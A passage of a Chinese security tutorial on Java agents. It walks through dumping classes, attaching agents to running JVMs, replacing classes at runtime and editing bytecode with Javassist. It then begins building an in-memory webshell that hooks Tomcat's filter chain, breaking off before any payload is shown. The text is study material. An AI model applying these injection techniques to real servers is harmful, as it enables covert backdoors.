(dumpDir == null) {</span><br><span class="line">            dumpDir = ".";</span><br><span class="line">        }</span><br><span class="line">        if (classes == null) {</span><br><span class="line">            classes = Pattern.compile(".*");</span><br><span class="line">        }</span><br><span class="line">        System.out.println("[DEBUG] dumpDir: " + dumpDir);</span><br><span class="line">        System.out.println("[DEBUG] classes: " + classes);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static boolean isCandidate(String className) {</span><br><span class="line">        // ignore array classes</span><br><span class="line">        if (className.charAt(0) == '[') {</span><br><span class="line">            return false;</span><br><span class="line">        }</span><br><span class="line">        // convert the class name to external name</span><br><span class="line">        className = className.replace('/', '.');</span><br><span class="line">        // check for name pattern match</span><br><span class="line">        return classes.matcher(className).matches();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void dumpClass(String className, byte[] classBuf) {</span><br><span class="line">        try {</span><br><span class="line">            // create package directories if needed</span><br><span class="line">            className = className.replace("/", File.separator);</span><br><span class="line">            StringBuilder buf = new StringBuilder();</span><br><span class="line">            buf.append(dumpDir);</span><br><span class="line">            buf.append(File.separatorChar);</span><br><span class="line">            int index = className.lastIndexOf(File.separatorChar);</span><br><span class="line">            if (index != -1) {</span><br><span class="line">                String pkgPath = className.substring(0, index);</span><br><span class="line">                buf.append(pkgPath);</span><br><span class="line">            }</span><br><span class="line">            String dir = buf.toString();</span><br><span class="line">            new File(dir).mkdirs();</span><br><span class="line">            // write .class file</span><br><span class="line">            String fileName = dumpDir + File.separator + className + ".class";</span><br><span class="line">            FileOutputStream fos = new FileOutputStream(fileName);</span><br><span class="line">            fos.write(classBuf);</span><br><span class="line">            fos.close();</span><br><span class="line">            System.out.println("[DEBUG] FileName: " + fileName);</span><br><span class="line">        }</span><br><span class="line">        catch (Exception ex) {</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>manifest.txt</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Premain-Class: ClassDumpAgent</span><br><span class="line">Agent-Class: ClassDumpAgent</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br></pre></td></tr></tbody></table></figure><p><strong>编译打包</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javac .\src\ClassDump*.java -d .\out\</span><br><span class="line">cp .\src\manifest.txt .\out\</span><br><span class="line">cd out</span><br><span class="line">java -cvfm classdumper.jar .\manifest.txt .\ClassDump*.class</span><br></pre></td></tr></tbody></table></figure><h2 id="4-编写Attach"><a href="#4-编写Attach" class="headerlink" title="4.编写Attach"></a>4.编写Attach</h2><p>将一个Agent Jar与一个<strong>正在运行的Application</strong>建立联系，需要用到Attach机制：</p><p><strong>Attach.java</strong></p><ul><li><strong>VirtualMachine</strong>代表一个 Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了 <strong>JVM 枚举</strong>，<strong>Attach</strong>动作和 <strong>Detach</strong>动作（Attach 动作的相反行为，从 JVM 上面解除一个代理）等等 ;</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.tools.attach.VirtualMachine;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Simple attach-on-demand client tool</span><br><span class="line"> * that loads the given agent into the given Java process.</span><br><span class="line"> */</span><br><span class="line">public class Attach {</span><br><span class="line">    public static void main(String[] args) throws Exception {</span><br><span class="line">        if (args.length &lt; 2) {</span><br><span class="line">            System.out.println("usage: java Attach &lt;pid&gt; &lt;agent-jar-full-path&gt; [&lt;agent-args&gt;]");</span><br><span class="line">            System.exit(1);</span><br><span class="line">        }</span><br><span class="line">        // JVM is identified by process id (pid).</span><br><span class="line">        VirtualMachine vm = VirtualMachine.attach(args[0]);</span><br><span class="line">        String agentArgs = (args.length &gt; 2) ? args[2] : null;</span><br><span class="line">        // load a specified agent onto the JVM</span><br><span class="line">        vm.loadAgent(args[1], agentArgs);</span><br><span class="line">        vm.detach();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>编译打包</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -cp "%JAVA_HOME%/lib/tools.jar";. src/Attach.java -d out/</span><br></pre></td></tr></tbody></table></figure><p><strong>运行</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp "%JAVA_HOME%/lib/tools.jar";. Attach 11104 D:\Programs\JavaProjects\JAgentTest\java-agent\out\classdumper.jar dumpDir=D:\Programs\JavaProjects\JAgentTest\dump,classes=sample\.HelloWorld</span><br></pre></td></tr></tbody></table></figure><h1 id="三、使用Agent替换JVM中的类"><a href="#三、使用Agent替换JVM中的类" class="headerlink" title="三、使用Agent替换JVM中的类"></a>三、使用Agent替换JVM中的类</h1><p>这次使用IDEA做实验，参考自<a target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/1.%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ASM%E5%AD%A6%E4%B9%A0/index.md">Y4tacker</a>师傅<br>![image-20230517203835837.png](从Java Agent到内存马.assets/1685067113_64701569eb167f74326a8.png!small)</p><h2 id="1-pom-xml"><a href="#1-pom-xml" class="headerlink" title="1. pom.xml"></a>1. pom.xml</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;project xmlns="http://maven.apache.org/POM/4.0.0"</span><br><span class="line">         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span><br><span class="line">         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;AgentMainTest&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.sunn&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;tools&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.8.0&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;system&lt;/scope&gt;</span><br><span class="line">            &lt;systemPath&gt;E:/Enviroment/jdk8u121/lib/tools.jar&lt;/systemPath&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.21.0-GA&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line"></span><br><span class="line">        &lt;pluginManagement&gt;</span><br><span class="line">            &lt;plugins&gt;</span><br><span class="line">                &lt;plugin&gt;</span><br><span class="line"></span><br><span class="line">                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                    &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class="line">                    &lt;version&gt;2.2&lt;/version&gt;</span><br><span class="line">                    &lt;configuration&gt;</span><br><span class="line">                        &lt;archive&gt;</span><br><span class="line">                            &lt;manifestEntries&gt;</span><br><span class="line">                                &lt;!--改这个为代理类--&gt;</span><br><span class="line">                                &lt;Agent-Class&gt;AgentMain&lt;/Agent-Class&gt;</span><br><span class="line">                                &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt;</span><br><span class="line">                                &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;</span><br><span class="line">                            &lt;/manifestEntries&gt;</span><br><span class="line">                        &lt;/archive&gt;</span><br><span class="line">                        &lt;skip&gt;true&lt;/skip&gt;</span><br><span class="line">                    &lt;/configuration&gt;</span><br><span class="line">                &lt;/plugin&gt;</span><br><span class="line">            &lt;/plugins&gt;</span><br><span class="line">        &lt;/pluginManagement&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="2-application"><a href="#2-application" class="headerlink" title="2. application"></a>2. application</h2><p>在src/main/java目录下写</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//TransClass.java</span><br><span class="line">public class TransClass {</span><br><span class="line">    public int getNumber(){</span><br><span class="line">        System.out.println("我返回1， 求HOOK");</span><br><span class="line">        return 1;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">//Test.java</span><br><span class="line">public class Test {</span><br><span class="line">    public static void main(String[] args) throws InterruptedException {</span><br><span class="line">        System.out.println(new TransClass().getNumber());</span><br><span class="line">        int count = 0;</span><br><span class="line">        while (true) {</span><br><span class="line">            Thread.sleep(500);</span><br><span class="line">            count++;</span><br><span class="line">            int number = new TransClass().getNumber();</span><br><span class="line">            System.out.println(number);</span><br><span class="line">            if (count &gt;= 10) {</span><br><span class="line">                break;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>修改TransClass.java为恶意类，编译并将编译后的结果改名为TransClass.class.2</p><p>注：编译后的结果在<strong>target\classes</strong>目录下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//TransClass.class.2</span><br><span class="line">public class TransClass {</span><br><span class="line">    public int getNumber(){</span><br><span class="line">        System.out.println("Hooked by s8ark !!!!!");</span><br><span class="line">        return 2023;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="3-编写Agent-1"><a href="#3-编写Agent-1" class="headerlink" title="3. 编写Agent"></a>3. 编写Agent</h2><p>写个Transformer，把恶意类路径搞进去</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//Transformer.java</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.lang.instrument.ClassFileTransformer;</span><br><span class="line">import java.lang.instrument.IllegalClassFormatException;</span><br><span class="line">import java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line">public class Transformer implements ClassFileTransformer {</span><br><span class="line">    public static final String classNumberReturns2 = "D:\\Programs\\JavaProjects\\AgentMainTest\\target\\classes\\TransClass.class.2";</span><br><span class="line"></span><br><span class="line">    public static byte[] getBytesFromFile(String fileName) throws Exception {</span><br><span class="line">        FileInputStream fileInputStream = new FileInputStream(new File(fileName));</span><br><span class="line">        byte[] bytes = new byte[1024];</span><br><span class="line">        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        int a;</span><br><span class="line">        while((a = fileInputStream.read(bytes)) != -1) {</span><br><span class="line">            outputStream.write(bytes, 0, a);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        return outputStream.toByteArray();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {</span><br><span class="line">        if (!className.equals("TransClass")){</span><br><span class="line">            return null;</span><br><span class="line">        }else {</span><br><span class="line">            try {</span><br><span class="line">                return getBytesFromFile(classNumberReturns2);</span><br><span class="line">            } catch (Exception e) {</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                return null;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>写个AgentMain</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//AgentMain.java</span><br><span class="line">import java.lang.instrument.Instrumentation;</span><br><span class="line">import java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">public class AgentMain {</span><br><span class="line">    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {</span><br><span class="line">        inst.addTransformer(new Transformer(), true);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        for (Class clazz : classes) {</span><br><span class="line">            if(inst.isModifiableClass(clazz)){</span><br><span class="line">                if (clazz.getName().equals("TransClass")){</span><br><span class="line">                    inst.retransformClasses(clazz);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="4-编写Attach-1"><a href="#4-编写Attach-1" class="headerlink" title="4.编写Attach"></a>4.编写Attach</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">//AttachTest.java</span><br><span class="line">import com.sun.tools.attach.AttachNotSupportedException;</span><br><span class="line">import com.sun.tools.attach.VirtualMachine;</span><br><span class="line">import com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class AttachTest {</span><br><span class="line">    // 一个运行 Attach API 的线程子类</span><br><span class="line">// 每隔半秒时间检查一次所有的 Java 虚拟机</span><br><span class="line">    static class AttachThread extends Thread {</span><br><span class="line">        private final List&lt;VirtualMachineDescriptor&gt; listBefore;</span><br><span class="line"></span><br><span class="line">        private final String jar;</span><br><span class="line"></span><br><span class="line">        AttachThread(String attachJar, List&lt;VirtualMachineDescriptor&gt; vms) {</span><br><span class="line">            listBefore = vms;  // 记录程序启动时的 VM 集合</span><br><span class="line">            jar = attachJar;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void run() {</span><br><span class="line">            VirtualMachine vm = null;</span><br><span class="line">            List&lt;VirtualMachineDescriptor&gt; listAfter = null;</span><br><span class="line">            try {</span><br><span class="line">                int count = 0;</span><br><span class="line">                while (true) {</span><br><span class="line">                    listAfter = VirtualMachine.list();</span><br><span class="line">                    for (VirtualMachineDescriptor vmd : listAfter) {</span><br><span class="line">                        if (vmd.displayName().equals("Test")) {</span><br><span class="line">                            System.out.println("进程ID：" + vmd.id() + "，进程名称：" + vmd.displayName());</span><br><span class="line">                            System.out.println("捕捉到Test进程，准备Hook");</span><br><span class="line">                            vm = VirtualMachine.attach(vmd.id());</span><br><span class="line">                            break;</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                    Thread.sleep(500);</span><br><span class="line">                    count++;</span><br><span class="line"></span><br><span class="line">                    if (null != vm || count &gt;= 10) {</span><br><span class="line">                        break;</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">                vm.loadAgent(jar);</span><br><span class="line">                vm.detach();</span><br><span class="line">            } catch (Exception e) {</span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) {</span><br><span class="line">        new AttachThread("D:\\Programs\\JavaProjects\\AgentMainTest\\target\\AgentMainTest-1.0-SNAPSHOT.jar", VirtualMachine.list()).start();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后用maven把项目打包到target目录下<br>![image-20230517212555778.png](从Java Agent到内存马.assets/1685067156_64701594478e4c7a94d7a.png!small)</p><h2 id="5-运行"><a href="#5-运行" class="headerlink" title="5. 运行"></a>5. 运行</h2><p>先运行这个AttachTest后，再运行Test<br>![image-20230517213336716.png](从Java Agent到内存马.assets/1685067177_647015a9bace7714d4947.png!small)<br>![image-20230517213355375.png](从Java Agent到内存马.assets/1685067190_647015b6b192e2c92d477.png!small)</p><h1 id="四、遇见Javasist"><a href="#四、遇见Javasist" class="headerlink" title="四、遇见Javasist"></a>四、遇见Javasist</h1><p>Java Agent程序可以使用Java Instrumentation API或者JVMTI来动态修改Java字节码，但是这种方式需要编写大量的底层代码，操作复杂，容易出错。我们选择使用 Javasist来更加方便、快捷地对Java字节码进行操作。</p><blockquote><p>Javasist提供了动态修改字节码的能力。相比较于其他工具比如ASM，Javasist更加高层，不需要了解字节码文件的结构，但是运行效率不如ASM等更底层的工具。对于初学者而言，Javasist更加友好。</p></blockquote><p>参考自<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010900754/article/details/96745230/">CSDN博客</a></p><p><strong>Javasist的简单使用：</strong></p><ul><li>先引入依赖</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">          &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.20.0-GA&lt;/version&gt;</span><br><span class="line">      &lt;/dependency&gt;</span><br></pre></td></tr></tbody></table></figure><ul><li>待增强的类</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class Service {</span><br><span class="line">    public void service(){</span><br><span class="line">        System.out.println("doService");</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li>使用Javasist增强Service类</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class JavasistMain {</span><br><span class="line">    public static void main(String[] args) throws Exception {</span><br><span class="line">        // 创建一个ClassPool对象，获取默认的类搜索路径</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        // 从ClassPool对象中获取com.s8ark.service.Service类的CtClass对象</span><br><span class="line">        CtClass clz = classPool.get("com.s8ark.service.Service");</span><br><span class="line"></span><br><span class="line">        // 从CtClass对象中获取service方法的CtMethod对象</span><br><span class="line">        CtMethod serviceMethod = clz.getDeclaredMethod("service");</span><br><span class="line">        //在service方法执行前插入一段代码</span><br><span class="line">        serviceMethod.insertBefore("System.out.println(\"Insert before execute!!!\");");</span><br><span class="line">        // 在service方法执行后插入一段代码</span><br><span class="line">        serviceMethod.insertAfter("System.out.println(\"Insert after execute!!!\");");</span><br><span class="line"></span><br><span class="line">        // 将修改后的CtClass对象写入到class文件中 clz.writeFile();</span><br><span class="line">        //ClassPool会在内存中生成一个新的class文件，然后将修改后的内容写入到这个class文件中，</span><br><span class="line">        // 最后将这个class文件保存到磁盘上。这个过程中，并没有直接修改Service.class文件。</span><br><span class="line">        clz.writeFile();</span><br><span class="line"></span><br><span class="line">        Service service = (Service) clz.toClass().newInstance();</span><br><span class="line">        service.service();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li>运行结果</li></ul><p>![image-20230517220511565.png](从Java Agent到内存马.assets/1685069087_64701d1f6722c1b4cff46.png!small)</p><ul><li>反编译Service.class，发现原始类并没有被修改</li></ul><blockquote><p>调用clz.writeFile()后，ClassPool会在内存中生成一个新的class文件，然后将修改后的内容写入到这个class文件中，最后将这个class文件保存到磁盘上。这个过程中，并没有直接修改Service.class文件。</p></blockquote><p>我们可以在根目录下找到这个新的class文件，<br>![image-20230518104834635.png](从Java Agent到内存马.assets/1685069115_64701d3b07026a9ecec02.png!small)</p><h1 id="五、初步构造Agent-内存马"><a href="#五、初步构造Agent-内存马" class="headerlink" title="五、初步构造Agent 内存马"></a>五、初步构造Agent 内存马</h1><p>经过前面这么长的铺垫，终于来到了令人心动的内存马构造环节！</p><blockquote><p>在前面我们学习了如何<strong>构造一个Java Agent</strong>、如何<strong>使用Attach将agent加载到正在运行的JVM</strong>和如何<strong>使用Javasist修改字节码</strong>, 接下来就可以利用这些知识构造内存马了。我将这部分的学习分为三步：</p></blockquote><ul><li>构造application（一个受害者web应用，我将使用Springboot框架搭建）</li><li>编写Agent（包括AgentMain和Transformer），在Transformer中修改目标类字节码</li><li>编写Attach（将agent加载到application中）</li></ul><h2 id="1-构造application"><a href="#1-构造application" class="headerlink" title="1.构造application"></a>1.构造application</h2><p>实验环境：JDK1.8、IDEA、Springboot</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class VulnController {</span><br><span class="line">    @ResponseBody</span><br><span class="line">    @RequestMapping("/vuln")</span><br><span class="line">    public String cc11Vuln(){</span><br><span class="line">        return "Hello World";</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>![image-20230518170247029.png](从Java Agent到内存马.assets/1686532967_648673673690877cea431.png!small)</p><p>以下参考自<a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1582">天下大木头师傅</a></p><p>我们现在第一件事是需要找到对应的类中的某个方法，这个类中的方法需要满足两个要求</p><ul><li>该方法一定会被执行</li><li>不会影响正常的业务逻辑</li></ul><p>回想我们学习Filter内存马的时候，用户的请求到达Servlet之前，一定会经过 Filter，我们就可以找到<strong>ApplicationFilterChain类的doFilter方法</strong><br>![image-20230518172804332.png](从Java Agent到内存马.assets/1685069630_64701f3e6588aab8120f7.png!small)<br>同时在 ApplicationFilterChain#doFilter 中还封装了我们用户请求的 request 和 response ，那么如果我们能够注入该方法，那么我们不就可以直接获取用户的请求，将执行结果写在 response 中进行返回</p><p>以下是我们学习过的<strong>Container</strong>使用<strong>Pipeline-Valve</strong>管道来处理request对象的流程<br>![image-20230428165106021.png](从Java Agent到内存马.assets/1685069644_64701f4c42c2b0ebc2b14.png!small)</p><ul><li>当执行到StandardWrapperValve的时候，会在StandardWrapperValve中创建<strong>FilterChain</strong>，并调用其doFilter方法来处理请求，这个FilterChain包含着我们配置的与请求相匹配的<strong>Filter</strong>和<strong>Servlet</strong>，其doFilter方法会依次调用所有的<strong>Filter的doFilter</strong>方法和<strong>Servlet的service</strong>方法。</li></ul><h2 id="2-编写Agent"><a href="#2-编写Agent" class="headerlink" title="2.编写Agent"></a>2.编写Agent</h2><p>我们先定义一个Transformer,在其中使用javassist的 insertBefore将恶意代码插入到前面，从而减少对原程序的功能破坏</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 